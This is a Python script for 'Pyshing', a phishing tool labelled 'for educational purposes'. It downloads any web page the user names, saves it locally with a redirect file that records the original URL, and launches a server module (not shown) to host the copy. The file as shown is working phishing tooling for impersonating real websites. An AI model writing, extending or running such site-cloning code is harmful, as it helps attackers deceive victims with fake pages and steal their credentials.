#!/usr/bin/python
'''
Name: Pyshing 1.2
Version: Python 3.7.4
-
The tool is for educational purposes
-
https://github.com/r4msolo
Author: R4MSOLO
'''
from colorama import Fore, Style
import urllib.request

class Pyshing():
    def __init__(self):
        print(Style.RESET_ALL)
        print(options)
        opt = int(input("=>"))
        if opt == 1:
            try:
                self.pageClone()
            except OSError:
                print("[!] Error, check your internet connection\n")
        elif opt == 2:
            try:
                import core.server
                core.server.SimpleHTTPRequestHandler()
            except OSError:
                print("[!] Address already in use\n")
        elif opt == 0:
            quit()
        else:
            print("[!] Invalid option!\n")

    def pageClone(self):    #Clone the pages
        url = str(input("URL clone: "))
        contents = urllib.request.urlopen(url).read()
        contents = contents.decode('UTF-8')
        file = open('site/index.html','w')
        file.write(contents)
        file.close()
        print("[+] Main page copied... ")
        del contents
        file = open('site/redirect.txt', 'w')
        file.write(url)
        file.close()
        Pyshing()



banner = Fore.CYAN+'''
                                ,,          ,,                        
`7MM"""Mq.                    `7MM          db                        
  MM   `MM.                     MM                                    
  MM   ,M9 `7M'   `MF',pP"Ybd   MMpMMMb.  `7MM  `7MMpMMMb.   .P"Ybmmm 
  MMmmdM9    VA   ,V  8I   `"   MM    MM    MM    MM    MM  :MI  I8   
  MM          VA ,V   `YMMMa.   MM    MM    MM    MM    MM   WmmmP"   
  MM           VVV    L.   I8   MM    MM    MM    MM    MM  8M        
.JMML.         ,V     M9mmmP' .JMML  JMML..JMML..JMML  JMML. YMMMMMb  
              ,V                                            6'     dP 
           OOb"                                             Ybmmmd'  
                                             Version: 1.1
                                             Author: R4MSOLO\n
'''
options = '''
1) Clone a Website
2) Start Server
0) Exit
'''

if __name__ == '__main__':
    try:
        print(banner)
        Pyshing()
    except KeyboardInterrupt:
        print("[!] Finished...\n")
